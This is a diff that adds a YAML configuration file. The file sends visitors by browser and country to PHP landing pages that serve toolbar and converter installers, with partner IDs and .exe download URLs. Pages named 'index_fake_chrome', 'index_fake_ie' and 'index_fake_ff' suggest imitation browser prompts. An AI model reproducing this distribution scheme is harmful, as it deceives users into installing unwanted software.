@@ -1,0 +1,58 @@
+
+init:
+
+  iac:
+    
+    allin1convert:
+      use_by_default: true
+      code:
+        - browser chrome: allin1convertPartnerID_ch_wc.php
+        - allin1convertPartnerID.php
+      files:
+        - rindex.php
+        - index_frca.php
+        - rindex_chrome_RU.php
+
+
+  conduit:
+
+    main:
+      use_by_default: true
+      ctid: CT3297959
+      url: http://CT3297959.GreatToolbars.com/exe
+      files:
+        - rindex_chrome_US_CA_UK.php
+        - rindex_firefox_or_IE.php
+        - index.php
+        - index_fake_ff.php
+        - index_fake_ie.php
+        - index_fake_chrome.php
+
+    pdf:
+      ctid: CT3297951
+      url: http://CT3297951.GreatToolbars.com/exe
+      files:
+        - pdf.php
+
+
+
+rindex:
+  - browser chrome:
+    - country US, CA, GB: rindex_chrome_US_CA_UK.php
+    - country AU: rindex_chrome_AU.php
+    - country FR: rindex_chrome_FR.php
+    - country RU: rindex_chrome_RU.php
+    - rindex_chrome.php
+
+  - browser ie, firefox: rindex_firefox_or_IE.php
+
+  - country not US:
+    - browser safari: rindex_safari_not_US.php
+
+  - country FR: rindex_safari_FR.php
+
+  - browser safari: rindex_safari.php
+
+  - browser opera: rindex_opera.php
+
+  - rindex.php
